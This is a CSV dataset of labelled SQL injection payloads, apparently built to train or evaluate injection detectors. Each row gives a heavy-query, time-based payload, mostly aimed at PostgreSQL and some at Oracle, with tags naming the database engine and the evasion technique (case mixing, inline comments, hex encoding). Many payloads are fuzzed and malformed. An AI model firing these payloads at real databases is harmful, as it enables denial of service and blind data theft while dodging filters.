payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"2O0O1'+ |( <SELect blDN WhErE 1x0x88E LIKE 0X2081/*5F<od*/AnD 0X6b10101bB LiKE ? ( sEleCt cOUnt ( * ^)$ frOM{GENERATe_SeRieS ( 0O0x1,(seLecT (sELeCT 0x4C2O4b68)) @ ) ) OR/false oR!(SElECt 8Xaa9) NoT lIKE 0X0xaA9 or FaLsE AnD ""E""_nOt LikE ""Ep"" AnD ""$cY "" noT lIke ""$CY +"" or FALse anD?tRUE or fALSE oR FAlSE or fAlSE AnD (selECT (sELect 1)) aNd trUe --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"1 )/*DTjY*/ OR 8421= ( select count ( * ) FRom geNerate_sEriES ( 0x1,0B0b10000111101011001010001001000010000110011101010010110010000010001101010000 ) )",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"7O2"" ) ) OR (seLeCt 0X20E9) lIkE (. SEleCt counT"")(/**/ * ) froM GenerAtE_SERiES ( (seLEcT (SElEct (seLecT (SelEcT 1)))),0O0b8XD5E63ba9319202Ba7b81 ) ) aNd ( `:( ""uBxw"" likE ""UbXW",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"selecT""* fRoM genERaTE_serIEs ( 0O0b0b1100111011000000111011011110101111111,(SELeCT 0605),caSe when /**/ ( 3607 LIKE ,0b0b1110100011010100101101100000000001010100 )/**/ =thEn (SELECT 1)^ELSe (SelECt 0) END/**/ )[ lImit (seLECT 0x1)--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1""%;)/**/` as advZ{whEre 0X143e lIke (SELEct`(sELect\0X142E)) oR (seLeCT 8156)=AND TRUE oR FAlsE# ( SElECt coUNt ,( * )) ^fRom GeneRate_seRIeS (/*X|)f0o0x4V#Vs3b)@HPo*/ (SELeCT (sElEct (selECt (SELECT 1)))),0x0o4C9B0o50 ) ) And 0x110D NoT LIKe 0o20256 --g bbB~KqcU",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"3' /*Z^J:e:Y*/) AnD (sELecT 0x20D0X3x7) LIKE & ( SEleCT COUNt `( * ) `FrOm gENErATE_seRiES ( :(SeLECT (SELect (SelEct (SELEct (seleCT (sELeCT (SELECT 7))))))),0x4c0b0X74b0o50 ) ) } AND ( {'PgYl' liKe 'pGYL",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"sElect`* FrOm GENEraTE_serIEs ( (0547,(sElect 2317),cAse wHEn ( ]0B0b0x20fb* LikE (sEleCt 0X25Eb) ) tHEn (SELECT 1) ElSe/*zsrPa*/0x0 && TRUE +or fAlSE Or FAlSE oR fAlsE#END ) /*8O1y*/ LimiT,(SElect 0x1)--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SelECt * FrOm%generatE_sERiES ( 0O0Xd0O7B0B111162,0Xd13,CASe wHEN (> (seLECT~3427)_=`7519 [) /**/tHEn (sEleCT (SeLecT (SELECT 1))) eLSe<0X0 EnD& ) LimIT (sEleCT (SelecT 0X1))--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SelECT Count /(. * ) `FRoM GEnerATe_sEriES ( 0O1,0O8x9C6a80 ) *^anD ""%"" +LIke <""",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0X1',/*,T0B100W)n_OI)i6I] x*/ ( cASt` ( *( Chr (! 8X67 ) ||cHr ( ?0x71 ) ||chr ( 0O0O860 ) Or ChR <( (selecT 0o0X38) ) ||chr ( /* EZ*& nEV/*j*e)U*/3N<Ij*j1TQSGO*/(select (sELECt (SeLeCt (SELeCT 0X71)))) ) ) OR ( sELeCT}(sElECt 0X0O1) FROM&GEnErATe_SErIEs ( 0x2313,(SEleCt 0x3D3),CAsE When : ( 0x0B10101fb like 7X2413 ) tHeN (SeLeCt (Select (SeLECT (selECT (Select 1))))) elsE 0b0O0 ENd ) lIMiT (sELEcT (SELeCT (sELect 1))) <), ::TeXT OR (~ Chr ( (sElECt/**Jl2!]_PByy%f&D*/(SeLeCT (sEleCT (seLeCT (SELect (sEleCt 0x99)))))) ) ||cHR ( 0x26e ) !OR cHR (/ (SELect (SELeCt 0X265)) ) oR |CHR ( 9x7a ) Or cHr ( (selECt (Select (SElect 0xB5))) ) ) } ;as nuMERiC ]) )",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,unknown
"0B4"" ) / ) or/**/(SELeCT 8421) lIKe (( sELecT coUNt ( * ) frOm gENERatE_Series ( (SELECT 2),0o0B0o0b10001100110110001010101101101100011110000101011011001010001011000000001100010010110110110, ) ) ANd ( ( ""vheY"" = ""vHEY",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"7< )!+ As/*x[y*/dQda wHeRE 0o0X658 =.(SelEct(0x652): aNd 0X3x0X15ae"" lIKe ( sEleCt$cOUnT ( *= ) . frOM gENeRate_sERIeS ( 0o0x1,(sELect (SELEct[5X4D35FC))| ) } ) OR[(sElECt (sElECt 1x2218)) nOt) lIkE (sElEct (sEleCT (selECT (SeLECt 8758))))""or FAlSE AND[TRuE || 0B0 anD true OR False --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0o5"" ),> ): ANd (SELEcT (SElEcT (selECT (SelECt (SELeCT (SELECT 8625))))))= (~ SEleCT/** o @U9l*/cOuNT ( {* ) FRom GeNERATe_sERIEs ( (SElecT 0X0B11),0B0B0O23045560 ): {) Or ""K.KU"" not LIke ""k.Ku"" or 0x0 ANd truE OR fAlSe AnD TrUE --",heavy_query,postgresql,case_variation|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SElecT[cOuNt |( * ) from geneRAtE_sErIeS ( (SeLECT (SeLect (SeLect (SELECT 1)))),0X4C4dFE ) [ And * ( ( '%' Like '",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"1' ) /**/AS[UqkZ wHErE (SElEcT (sELecT (SELECT 1282))) lIkE (sEleCt[(selEcT 0b0x210e))!and:(SElect 8467) =! (< sELECt<couNT ( * ) FRom""gENeraTe_SeRies (} (SeLEcT (selEcT 0x1)),0X0O23045574 ) ) oR 0x0X0 or)&""rnr"" Not LIkE ""RnR"" or False --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"selECt COunt ( * ) froM genERaTe_seRieS ( (SeLeCT (SELECT 6)),(SeLEcT 0X9C4DfC) ) aNd ( (( ]( 'XOrI' lIKe 'Xori",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"sElECT`cOUnt ( anD'TRuE OR faLse OR False#* ) FrOm gENeRAte_seriES ( (SELeCt (SelEct 0X0O1)),0b0b0o9x21EB4A53610fC251540 ) && ( ( ( 'lDQQ'='lDQQ",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"3"" ) or (selEcT 0b0X20e0x9) lIKE ( seLECt coUNt ( :* ) from geneRAte_SERIes ( (SeLect (SELECT (SELECT 7))),0o0x4c0x5ae0 ) ) AnD :( ""ctrR"" = ""CtrR",heavy_query,postgresql,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"SELecT * FroM geNeRAtE_SerIES ( (SELECT (SELECT 7536)),0x1D6F,CasE wHeN () 0X1D70^ LIkE (SEleCT (SELECT 7523)) ) thEn (SElecT 1) ELse 0B0 eND ) lImit 0X1--",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"SELeCT * frOM GENeratE_serieS ( (SELECT 9864),(SeLecT (selECT (SELECT (SELECT 9363)))),CASe WHEn ( *(SeLEcT 0x23ba)/**/ LIKe ` 0x0b0Xd05 ) THeN (sELECT 0x1)@eLsE 0 EnD ) Limit 0x1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1"" WheRe 0XBad == anD TRUE or faLse oR (sElecT 2742) Not liKe 0xab6 or FalsE or fALSe OR False# 0xbAd Or 0x20e5 lIkE !( sELEct CoUnT ( ;* ) froM GEneRate_SErIes ( 1O0b1,0X4c0o4B10 ) ) && (selECT (SeLEcT 0)) --a$w;{",heavy_query,postgresql,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1 + )]. ) aNd 0o0X30D7 (LIkE ( SeleCT COunt ;( * !) from GenerAtE_SERIEs ( (SELEcT 3x1),0X4c4B0o0O2O0O0O40/ ) ) ANd ;(/*f (sELecT (SELECT (SELECT 4)))C*/ }( 0x1787 lIKE 4357",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"9 : ) ) ) oR<0o4x3fe , lIke ! (> SeLecT CoUNT ( * ) from ALL_userS t0O0,aLL_useRs t8,aLL_USers?T2O0x3,AlL_USeRS t6,alL_USeRs T5 [)! And/**/0O0xA7X0b0X4d<>(seLeCt (SElEcT 0Xa78))>aNd-TruE ANd $TruE OR/*&Go^*/?(selEct (SelECT (sElecT (SeLECt 4X0)))) && trUe aND TRUE ANd trUe oR FAlSe Or (SELECT (SELECT 0)) OR fALSe --",heavy_query,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"1%"" ) _ AND (sElecT (SelECt (sEleCT (SElEcT](seLect (SELECT 8507)))))) @= ( selEct^cOUNT ( * ) FROM GeneRaTe_SeriEs ( 0x0X6,0x1a1184 )! ))? 'AnD ( '""%""=""",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"SelecT * from GENeRAtE_SerieS (& (SelECt (SElECT 8617)),(sELEct 0X1C8e),CASe wHEn ( (SElECt (SeLecT 0x1dce)) ?= 0x24C8 anD '`'%liKE '`' /**/ && ? 0X1 aND 0x187a NOT lIKe^0x0b10111011b OR 0 AND True OR False# )_ ;THEn 0x8 ElSE 0B1 ENd ) LImIT_(seLECt 1)--gkh :<LXM",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,numeric
"1 )? ) ) ||0b100O07774 LiKe , ( sElEct cOUnt ( * ) frOm gENeRatE_sERIEs ( (seLecT (SElECt (sElect (SELecT (SeLECT (SELECT 1)))))),0x4c62b2 ) )> and""3X5 oR FalsE --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1%' _) ANd 0o0b0b0x0o0b0b11100101110100010111111110101100010111100100001111010000010001110101010111101110100101011100100101000000001001110001100111110011101101100000111 = ( SeLeCt Count ( * ) }FrOM geNeRate_seRIeS ( 1,(SelEct 5000000)% ) . ) aNd ( ]'%'/**/={'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"6%""% ) && 0X207F = /**/ (: SelECT cOunT .( * ) | fRom;GENerAte_SERieS ( (SeLeCt 8B9B0O0b0X1),(sElect 0x1X0X7O4C4b68) ) ); : OR ';' lIKe`';+'>or 'S~; ' NOT liKE 'S~; '{oR (SEleCt (sELEct 0x0)) or FaLSe AND True OR False --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SelECt/*{rIWL*/* fROM GeNERaTe_sERIeS (/ 0XB1e,(sElECT (SeLeCT (seLecT 0b1011011010110))),caSe WHEN ( 7X66d6 lIke 0X146B \) THeN (SElEct (SeLECT (SELECT 1))) elSe (SeleCt 0x0) enD ) )limiT 0B1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1' OR $( /*?F;*/sELecT 'xUOF' frOm<duaL WhERE 0X0o344a =$(SeLEct (SelECt 8994)) oR (SElecT (SELECT 0x1fdb)) =( ( SeLEct COUNt ( * )+ fRoM GeNerAte_SERieS ( 0X1,(SELECT 0x4d35a0) ) > ) +or FAlse --",heavy_query,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_single_quote
"2 ) ) AnD (sELECt (selECt (seLecT (selecT 0x1040)))) =liKE ( ,selECt count ( * ) from ALL_users T0x3O1,ALl_uSerS t3,ALl_USErs T0o3,ALL_useRS T7,All_UsErS~t6! )?@oR (seLECT (SELECT 2467))}not(like (sElECt 0O0x14f4) OR fAlSE oR (SELECT (SELECT (SELECT (SELECT 6610)))) /**/NOt lIkE *<(sELecT 0x19d7) --",heavy_query,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1%"" or 8424 like /**/ ( sELEcT count ( * .) frOm/*(SELECT 0)((SELECT 1)|wm'U:*/GEnERATE_sERies (, (SELECT 0x1),(sElecT+(sELect (SELECT 0x4c4ba0o3)))[ ) + ) , AnD>""%""=""",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"select count ( * ) from generate_series ( (SELECT (SELECT 1)),(SELECT:0x4c4b40) ) and/**/ ( ""jzmg"" = ""jzmg",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"sElEct^cOuNt $( _*; ) FroM;GeNeRAtE_seRIEs ( 0b110X0O0X1,0x0O4c4b0o106 )\",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"9' "") `OR 0X2B10100E2o4=(""( SeLecT cOuNt ( *` ) FrOM geNeRATe_SeRieS ( (seLECT (select 0B1X6)),0B11x0o5x7c4b45/*n: aFzhi\(SeLEcT (sElEct 0X5))?dK8cZUue:fC*/ ) ) and& ( $'OBMU'` LIkE 'ObMU",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"5X1%' *) ) Or (SEleCT (SeleCt (SeleCT 6156))) LIke ( sELECT;COUnt ( * ) FROm geNERaTE_SerIeS ( /*|(_4'wu|K}DDeqM$Z*/(SELECt (sElECT 0X1)),0o0O0x15FA580 ) ) *--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"7X9'+ +( seLECt HSeF wHErE (SELeCt 0X0X1027) %= (seLECt (SEleCT 0x105a));Or/**/(SELeCt 8421) =] ( SeLEcT COuNT :( * ) fRoM gEnerate_SEriEs ((*0x0B0o0b0x4,(sELEct (seLECt 5200460)) ) )! ) +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"3X0B0b6""AND8x0cef= (``seLECT count ( * )< FroM\gENeratE_seRieS ( (SELECt (SElEct 0o1x1)),0x4c6B0o30 =/~O*/bVpLpC*/), ) + aNd ""ESlo"" liKE ""esLo",heavy_query,postgresql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
"1 ! ) ) /*A*/ As tBiq wherE (sElecT (sELeCt (sELeCT 7259)))=0x1bF7 ANd (SELEct 0X21Bb) LIKE ( sEleCt COUNT ( &* ) fRoM GENErAtE_SERiES ( (SeLect (sELecT (SELECT 9))),0X4C2ae0 ) ! ) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1' OR ( SELEct 'UyFo' whERE (SElect (SELECt\0B0X4B6)) likE (sElECT (SeLEcT 0x4d1)) or,0O12246 ]= /**/( ^SeLect`cOUNT ( * ) FROM ALl_uSErS t0,aLl_usERs T2,aLL_UsERS t3,alL_UseRS T0x4x0,All_USErS/*h (seLecT (SeLECT (SElECT (select 0X1))));w{Lh(l ANd (SELeCt 419)!=(SElEct 420) Or fALse OR False#=H\*/t0&/**/ ) `) ; ;oR/**/ 'i^DJ~",heavy_query,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"4%""[or (SELECT 0x1fdc) = ( select count ( * ) from generate_series ( (SELECT (SELECT (SELECT 1))),0o0x4c4b20 /**/) ) ) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1' Or ( selEcT 'Votg' wHeRE 2x0B1108f6 LiKe (SELECT 0X13f0o0o0b1) Or (SELECT 8156) = ( SELEct*count ( * ) fROm geNerate_SeRieS ( 0X1,(selEcT 0X4C4b40) ) ), OR/(SELEct (SELEcT (SeLeCT (SELECT 0x8)))) oR '%' NOt lIkE '%' or faLSE or FAlse or 6 && """"P""`NOt like ""pB"" OR 0x9e4 likE (SeLecT (SELECT!2733)) aNd truE OR 2289!=(SELECT 2289) --",heavy_query,postgresql,case_variation|function_alternative|scientific_notation,0.46,rule,sqliv5_json,string_double_quote
"1 ) As ADzJ whERE 0X15C9 /*|O}tE9mrs.WhUXU;Dru$?*/= 0O0X15c7 or+0X20e4 =: ( selEcT CoUNt]^( * ) FROM GeNeratE_serIes ( 0x0x1,0x3C4b48} _) `) OR 'a' Not LIke 'A' AND (sEleCT (SeLEcT 0x1)) aNd (seLECt.0O0x1949) noT lIke!(SeleCT (SELect (SELECT (SELECT (SELECT 6473))))) or FAlse or faLSe aND ""R}""<>""R};"" or falSE OR False AND True --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"0O0o5"" whEre 0b0O7X784=(seLect 2820) anD 0x0o0x69Bb=&]( SeleCT COunT>!(/ * ) ;FRom geNeRAtE_Series ( 0x1,(sELECT (seLeCT 0X4D6C59)) ) ) or}'F?' Like 'F?v' aNd (SelEcT 1) OR 0 OR 0 or FAlsE && tRue OR~FALSE --",heavy_query,postgresql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,numeric
"5"" "")$ _)> "")? oR 0X4x2FDc* lIKE ?\(^~sELECT cOunt (] *;')"" >fROm]geNerAte_SeRIES (^ 7x1,0X0O7X4c4B75 ;%) ) OR>8x6 && 8X0B110/*|S*/or FaLSe/*t*/ or False AnD~ tRUe OR ' V' not$LIke ' v' or faLsE Or FaLse OR FAlSe && ^trUE aND tRUE AnD 1 AND true oR fALsE oR (SeLect (seLect (sEleCT 1))) AND:(selecT 1) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,numeric
"1 ) WhERE (SELECT 5196) like (SEleCt 0X13E8) and (sElECT 0x221F) liKe /*YYV*/ ( sEleCt coUNt (` * ) frOM geneRate_sERiEs ( (sELECt 0o1),(selEcT (SELect 0x4C4b40)) ) ) !--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"SElect *~FRom GeneRate_sERIEs ( (seleCt (SELECT (SELECT 7494))),(SeLECT 0b1100101011110),cASe wHEN ( ?7494=7054 &) TheN (SELECT 0X1) eLse 9X0X5 END- ) lIMIT<(SElEcT 0b100)--",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"1"" WHerE 0x1815 = (SELECT 0b1000001110101) aND 0b0b10010001100001001111000110101010000000111111= ( SElEcT CoUNt ( * ) FRoM gEneRaTe_SErIES ( (SELECT 0x1),(SELECT 1000000)$ ) ) --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"sELEcT cOUNT ( *} )""_[FRoM geNERatE_seRIES ( 8X3b2b0X8o3E9B9b0b1001b1801111O11,0B400X0o4c7b0o107%?)./*\ P!O(SkKf(S aEc0B100OEVTJ*/ anD& ($* <(?[ ( <'%' }[[liKE` > '<cT",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"SElECT COunT%,(} * *) !FroM generatE_SerIes ( 0O0O11,0x0B760110Df20 )]/*7HOM[58GTk~:;j`*/(And < ( !(_ ""bHmU""_LiKe ""BhMU",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0o1 wheRe 0xBaC noT LIke >(SEleCt 0X1XBac) oR 0X3fE likE] ( ?selEct/*e2*]6V=*/couNt ( * ) fROm aLL_uSers t0o9,AlL_USErS t2,all_users;t0B0xB,ALL_USErs t4,alL_USerS?T5% ) or (SeLeCt 7X0)&&TRuE oR (SelEcT (SEleCT (SELecT 0b0))) aNd ""Y""=""Y"" ANd tRue oR 0X1C28=(sELEcT (SELECT (SeLeCt (sElECT (SELECT 4209))))) Or FALse oR (SeLECT 0X0) OR FAlsE And 'GJ'<>'gj|' --",heavy_query,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"SELecT cOuNT ( k(D!* "") frOM GenERATe_SERies ( 4x3,0O0o23040506 ^) [:AnD 'fAhy' LIke 'fahY",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"0B75%""*. ) ) Or^.8x22Ef liKe& (,;SeLecT coUNT -( * ;) fRoM;GeneraTe_SeRieS ( 0b0O10O3,0o9b0O8x0o4C3B45. ) ) ), ANd . ( (+ ""%"" {LikE? """,heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"1"" ):` aND 0O0b0b10010001100011001100110100100111101001000100 : LIke ( SelEct couNt @( * ) fROm GeneRAtE_seRieS ( (SELEct 0O10),(SELEct 0x4C0O5b68) ) > ) oR[fALSE or falSe --",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0b1 ) + aND (sElEct 8635) lIKe ( sELeCT cOuNT +( *^ ) ; fROm gEnERATe_SeriES ( (sElECt_6),0X4b100C0x4b40 ) ) OR 393!=(SELECT 393) AND (SELECT (SELECT 0x1)) --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"seLEct coUnT ;( * ) fROm\geNeRAte_SeriEs ( 0O1,0x0o23065500 ) AND ( ( [( (SeLECt (SELECT 1321)) lIKe 1301",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"SeLeCT:COUnT (= * ) frOM gENERatE_SERieS ( (seLECt (SELECT (SELECT 1))),(SeleCT 0x4C6e68) ) aNd[ ( ( (/**/ ""uydM"" LiKE ""UYdm",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1' ) OR 8421 = ( SeLEct cOUnt ( * ) FROM generATE_sEriEs ( 1,0B0b10000111101011001010001000111111100111110101111110000111010001010101000000 ) ) aND ( 'xkxI' LiKe 'XKXI",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"0O1' ) : ) ; :) and>(sElecT 0B0B0110100100010000010000005000010100000011) LikE ( =SELeCt counT ($ * ) FrOM(GENERATe_seRiEs (} 0x1,0x4c4B0B110000 ) %) ; Or (sElECT#8X2O0)%--?`U$",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1"" ) ) ) or 0B0x9284f1C1735 = ( SEleCT coUnT` (. * ) FroM GEnEraTe_sErIes ( (SelECT (SeLeCT (seLeCT (SELEct (SELECT (SELECT (SELECT 1))))))),0o23045510 ) ) AND ( ^( ( ""lYnw"" LiKE ""LYnW",heavy_query,postgresql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1X0X1"" ) ANd (seLeCT (selEcT (select (SELECT 8407)))) = ( sElECt@cOUNT ( *_ ){ From GeNERaTE_SerIEs (/**/ (selECT (SELeCt (SeleCt (SELECT 1)))),0B0B0o0O0x228060cE12207267dA1cF84 ) +) ANd ( ""kSsm"" ~liKE ""kssm",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1' ) ) ) AND 0x29D7 lIKe ^( selEcT COunT ( * ) from geNeraTE_sErIeS ( (SeLect (Select (SElECt 6))),(selEcT (sElEct 0x4F59ac)) ) ) and ( ( ( 'qgRT'='QgRt",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"SeLEct(CoUNT ( AnD TRUE OR (SELECT 5809) NOT LIKE 5809 OR False# * ) frOm geNEratE_seRIeS ( (SeleCt.(SELECT 1)),0o0O0b1010111111010111001014010 ) AND '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,numeric
"1%' ) ) ) OR/*iMC&jt&&uj jtru*/0b0x5X0o1fDC ?= ( SElecT cOUnT ( * ) frOM gEneRaTe_seRies ( (sElEcT (SEleCt (SELeCt (SelECT (SeLECT (SEleCt 0x0)))))),0X7AFa26 ) ) or (sELECT 4X6X3b0)| && 'r' noT LIKe 'RL' anD ""el""=""EL"" ANd 'Jj' NOT LIKe 'Jj0' aNd TruE or fAlsE Or FAlSE AND truE --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0O0O0o1%' Or 0x20e9 LIKE. /*f*/ ( sELECt cOuNt ( * ) { FrOM geNerAte_series ( (SELECT (SELECT/(SELECT 1))),(SELECT (SELECT 0x4ce880)) ) "") aND '%' liKE '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"((- select (SeleCt (seLeCT 1)) FRoM'geneRatE_sErieS (/*I$Pvu*/ 0X2143,8515,cAse wHEn ( }(SeLECT (SELECT (seLeCt (SELECT 8515)))) < like* ?0XD0B1011010 ^)> |thEN%2 else 3X0 ENd` ) LImit$0X1 {)",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"3. $) } ) ? oR` 7X0X0X20e0o0O0] like< (% SeLECT cOUnt ( * ) * frOm}gENeratE_SErIes ( (SELecT (seLeCt 0X4)),0B0B1O3x1B773E8187f0016e8A2F4} )/*yAFQ*L,b?*/ . ) , && ;( (_ (SeLECt (SeLECT 0x2475))=0o2375",heavy_query,postgresql,case_variation|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"seLeCt * froM GENeratE_seRIes ( 7237,(SELEct (SelECt (SelECT (SELECT 7237)))),CaSe whEN ( 0x1C45 LikE 0o23035 ) /**/ THeN (sELeCT 7) eLsE (SELECT 0o0) EnD ) LimIt 1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1' ) wHEre 0x14C0O4 lIKe (SElecT 0X14C0x0o5) And+(SeleCt (SELect (SelECT (SELECT 8407))))] like+ ( SELEct cOunT ( * ) FrOm GEnERAtE_sEriES ( 0o4x1,(sElEct&(SELect 0x0X0x4C0X2E68)) ) ) OR (sELect 0x360)%NoT LIkE (SELECt 0X330) or/*Ba|bfl27A*/ FALSE ANd (SeLECt (SelECT (SeLEcT (SeleCt 0X1)))) And ""T"":Not LiKE ""TZ"" and '`' nOT LIKe '`\'^--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
